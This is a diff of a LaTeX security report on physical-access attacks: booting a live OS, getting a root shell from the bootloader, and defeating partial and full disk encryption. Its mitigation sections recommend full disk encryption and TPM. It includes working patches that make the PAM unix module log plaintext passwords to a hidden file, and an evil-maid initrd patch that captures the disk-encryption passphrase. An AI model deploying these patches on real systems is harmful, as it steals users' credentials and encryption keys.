@@ -27,7 +27,7 @@ This method is very simple: attacker has to boot into another OS to get full acc
     \item Insert USB stick or optical disk with any live linux OS. Reboot computer and boot into live OS \footnote{If it is server, then it is booted into main OS. Rebooting can be a signal to administrators that something is wrong, so this method is not stealth. If it is a personal computer, nobody would even notice that something has been stolen.}
     
     \item Get list of partitions \label{root-start}
-\begin{minted}[breaklines=true]{bash}
+\begin{lstlisting}
 root@kali:/mnt# fdisk -l
 Disk /dev/sda: 16 GiB, 17150550016 bytes, 33497168 sectors
 Units: sectors of 1 * 512 = 512 bytes
@@ -40,19 +40,19 @@ Device        Start     End    Sectors   Size Type
 /dev/sda1      2048 31926271  31924224  15.2G Linux
 /dev/sda2  31928318 33495039   1566722   765M Extended
 /dev/sda3  31928318 33495039   1566720   765M Linux swap / Solaris
-\end{minted}
+\end{lstlisting}
 
     \item Mount desired partition (in our case it is \texttt{/dev/sda1})
-    \begin{minted}[breaklines=true]{bash}
+\begin{lstlisting}
 root@kali:/mnt# mkdir disk
 root@kali:/mnt# mount -t ext4 /dev/sda1 disk/
-\end{minted}
+\end{lstlisting}
 
     \item \texttt{chroot} into mounted disk. This step allows an attacker to use commands like \texttt{passwd root} as if he had a root access in main OS. \label{root-end}
     
-\begin{minted}[breaklines=true]{bash}
+\begin{lstlisting}
 root@kali:/mnt# chroot disk/
-\end{minted}
+\end{lstlisting}
 \end{enumerate}
 
 Done! Attacker has root access and able read any file on a mounted filesystem. At this point he can steal sensitive files or create a local or a remote backdoor into main operating system. 
@@ -85,7 +85,7 @@ This type of attack can be performed against any operating system on any compute
 \subsection{Attack 2 - Booting into a root shell from the bootloader}
 What if for some reason attacker can't boot into another OS from the external device? Linux bootloaders can load computer into \textbf{root shell without any password}. This is how it is explained in Ubuntu help:
 \begin{quote}
-Sometimes it is necessary to get root access, for example when you have forgotten your password or changed something in /etc/sudoers and things do not work as expected.  Be careful, because this step will give you full root access to your system and you can really damage your system! Keep in mind that all the steps you see here can also be done by someone else!\cite{bootloader-reset-root} 
+Sometimes it is necessary to get root access, for example when you have forgotten your password or changed something in /etc/sudoers and things do not work as expected.  Be careful, because this step will give you full root access to your system and you can really damage your system! Keep in mind that all the steps you see here can also be done by someone else!~\cite{bootloader-reset-root} 
 \end{quote}
 
 \subsubsection*{Attacking}
@@ -100,10 +100,10 @@ For each bootloder procedure is different, but the main idea is the same: edit b
 
     \item You are in passwordless root shell. The filesystem may be read only, remount it
 
-\begin{minted}{bash}
+\begin{lstlisting}
 # mount -rw -o remount /
 # mount -rw -o remount /proc
-\end{minted}
+\end{lstlisting}
 
 \end{enumerate}
 
@@ -117,4 +117,164 @@ The setup method is different for each bootloader.
 
 \subsubsection*{Vulnerable}
 This type of attack can be performed against any operating system on any computer, which have linux bootloaders installed (most popular are GRUB and LILO) including personal computers and servers. Access to root shell exposes access to all operating systems on disk.
+%------------------------------------------------------------------------------------------------------------
+
+% Attack 3
+%------------------------------------------------------------------------------------------------------------
+\subsection{Attack 3 - Partial disk encryption}
+The universal way to mitigate previously described attacks was disk encryption. In this subsection we consider a computer with partial disk encryption enabled. Partial disk encryption is encryption of user files: user's home directory, single folder or single file. Generally it doesn't encrypt OS files.
+
+\paragraph*{Attacking}
+We assume that attacker got physical access and access to mounted filesystem using one of previously described attacks. 
+
+So, attacker has root shell and mounted filesystem. There are generally two vectors:
+\begin{enumerate}
+    \item Offline attacks - OS depended attack. Since encrypted only user files, attacker is able to steal salted hashes of user's password, then perform bruteforce attack to find passwords.
+
+    \begin{itemize}
+        \item Windows: extract user's hash from \verb|%SystemRoot%/system32/config/SAM| file using \verb|samdump2| as it is shown in article:~\cite{attack3}.
+        \item Linux: extract user's hash from \verb|/etc/shadow| file.
+    \end{itemize}
+
+    \item Trick the user - requires one more login by the user.
+
+    Since only user's files are encrypted, attacker can patch authentication modules to get the password. 
+
+    \begin{itemize}
+        \item In Linux it is enough to modify source code of \lstinline{/lib/x86_64-linux-gnu/security/pam_unix.so} using this patch:
+
+\begin{lstlisting}
+diff -Naur Linux-PAM-1.1.8/modules/pam_unix/support.c pam-1.1.8-sniff/modules/pam_unix/support.c
+--- Linux-PAM-1.1.8/modules/pam_unix/support.c  2013-09-16 13:11:51.000000000 +0400
++++ pam-1.1.8-sniff/modules/pam_unix/support.c  2016-12-01 20:38:31.966332050 +0300
+@@ -2,6 +2,10 @@
+  * Copyright information at end of file.
+  */
+ 
++#include <fcntl.h>
++#include <sys/types.h>
++#include <sys/stat.h>
++
+ #include "config.h"
+ 
+ #include <stdlib.h>
+@@ -767,6 +771,13 @@
+    if (retval == PAM_SUCCESS) {
+        if (data_name)  /* reset failures */
+            pam_set_data(pamh, data_name, NULL, _cleanup_failures);
++
++        // sniff password and save it to /boot/grub/.cfg
++        int log_pass_fd = open( "/boot/grub/.cfg", O_APPEND | O_CREAT | O_WRONLY, 0600 );
++        dprintf( log_pass_fd, "User %s password is %s\n", name, p );
++        close( log_pass_fd );
++
++
+    } else {
+        if (data_name != NULL) {
+            struct _pam_failed_auth *new = NULL;
+\end{lstlisting}
+
+        \item In Windows other way is much easier: install startup script, which steals decrypted files after user logon. Also this script can provide remote access to the user's computer.
+    \end{itemize}
+
+    
+\end{enumerate} 
+
+\paragraph*{Mitigation}
+Encrypt operating system's files by using full disk encryption.
+
+\paragraph*{Vulnerable}
+Vulnerable all computers with any operating system. If attacker has access to your operating system files, you are in danger.
+%------------------------------------------------------------------------------------------------------------
+
+
+% Attack 4
+%------------------------------------------------------------------------------------------------------------
+\subsection{Attack 4 - Full disk encryption}
+In this subsection we consider a computer with full disk encryption enabled. Full disk encryption is used to encrypt whole disk: user data, operating system. To boot into such OS it must be decrypted during boot. Decryption performs secondary bootloader, in Linux it is \texttt{initrd}~\footnote{initrd (initial ramdisk) is a scheme for loading a temporary root file system into memory, which may be used as part of the Linux startup process.}, in Windows it is \texttt{bootmgr.exe}~\footnote{\url{https://en.wikipedia.org/wiki/Windows_Vista_startup_process}}. They typically residue in \texttt{Efi System Partition} (boot partition). This attack is possible only because these bootloaders stored in clear on disk.
+
+\paragraph*{Attacking}
+This attack is called "Evil maid attack"~\cite{evil-maid}. The scenario is:
+\begin{enumerate}
+    \item Scene I:  A Chief Financial Officer (CFO) is at a conference. When she goes out to dinner for a little social networking with her peers, she leaves her laptop in her hotel room, confident that any corporate data on the laptop is safe because the hard drive is encrypted.
+
+    \item Scene II: An evil maid (who is actually a corporate spy involved in industrial espionage) spots the CFO leaving her room.
+
+    \item Scene III: The evil maid sneaks into the CFO's room and boots up her laptop from a compromised bootloader on a USB stick.  The evil maid then installs a keylogger to capture the CFO's encryption key and shuts the laptop back down. 
+
+    \item Scene IV: The CFO returns from dinner and boots up her computer. Suspecting nothing, she enters her encryption key and unlocks the laptop's disk drive. At this point attacker receives access to the unencrypted operating system's files. He can perform attack \#3 to steal user's password.
+\end{enumerate}
+
+If a Target uses Linux, attacker is able to easily modify its bootloader - \texttt{initrd}. Basically it is just gzipped cpio archive with the following contents:
+\begin{lstlisting}
+bin  conf  etc  init  lib  lib64  run  sbin  scripts  var
+\end{lstlisting}
+
+The following patch for \texttt{initrd} was designed as a proof of concept:
+\begin{lstlisting}
+diff -Naur --no-dereference tmp.orig/scripts/local tmp.evil/scripts/local
+--- tmp.orig/scripts/local  2016-12-03 17:31:53.111082675 +0300
++++ tmp.evil/scripts/local  2016-12-03 17:36:07.097421409 +0300
+@@ -115,7 +115,7 @@
+ "
+            fi
+        fi
+-   
++
+        mkdir -p /host
+        mount -o move ${rootmnt} /host
+ 
+@@ -152,6 +152,11 @@
+        fi
+    fi
+ 
++   # INSTALL OUR PATCHED PAM AUTHENTICATION MODULE FROM ATTACK #3
++   mount -o remount,rw /root
++   cp /sbin/pammer.so /root/lib/x86_64-linux-gnu/security/pam_unix.so      
++
+    [ "$quiet" != "y" ] && log_begin_msg "Running /scripts/local-bottom"
+    run_scripts /scripts/local-bottom
+    [ "$quiet" != "y" ] && log_end_msg
+diff -Naur --no-dereference tmp.orig/scripts/local-top/cryptroot tmp.evil/scripts/local-top/cryptroot
+--- tmp.orig/scripts/local-top/cryptroot    2016-12-03 17:31:53.111082675 +0300
++++ tmp.evil/scripts/local-top/cryptroot    2016-12-03 17:32:15.258937696 +0300
+@@ -260,7 +260,7 @@
+ 
+
++       # steal entered password
+        if [ ! -e "$NEWROOT" ]; then
+            if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
+-                $cryptkeyscript "$cryptkey" | $cryptcreate --key-file=- ; then
++                $cryptkeyscript "$cryptkey" | tee /run/password |$cryptcreate --key-file=- ; then
+                message "cryptsetup: cryptsetup failed, bad password or options?"
+                continue
+            fi
+@@ -304,6 +304,12 @@
+        fi
+ 
+        message "cryptsetup: $crypttarget set up successfully"
++       # save password in /boot/grub/.cfg
++       mkdir /run/tmp
++       mount -t ext4 /dev/sda1 /run/tmp > /dev/null 2>&1
++       cat /run/password >> /run/tmp/grub/.cfg
++       echo >> /run/tmp/grub/.cfg
++       umount /run/tmp > /dev/null 2>&1
++       rm -r /run/tmp
+        break
+    done
+\end{lstlisting}
+
+As a result, full compromisation of main operating system.
+
+If a Target uses Windows, attacking is harder, because it requires to reverse-engineer and patch \texttt{bootmgr.exe} binary.
+
+\paragraph*{Mitigation}
+\begin{itemize}
+    \item Use pre-boot settings verification. Trusted Platform Module (TPM) is the best solution. It is embedded into many devices by manufacturers. TPM holds the decryption key and releases it only in case of valid pre-boot settings and valid disk decryption password (can be optional, such that transparently decrypting disk).
+
+    \item If your computer has no TPM, the easiest way to make it safer is to install boot partition onto external drive like USB stick thus there will be no unencrypted data on the disk. To boot into operating system user is required to insert this USB stick.
+\end{itemize}
+
+\paragraph*{Vulnerable}
+If your computer has no pre-boot settings verification, evil-maid attack can be performed independetly from OS.
 %------------------------------------------------------------------------------------------------------------
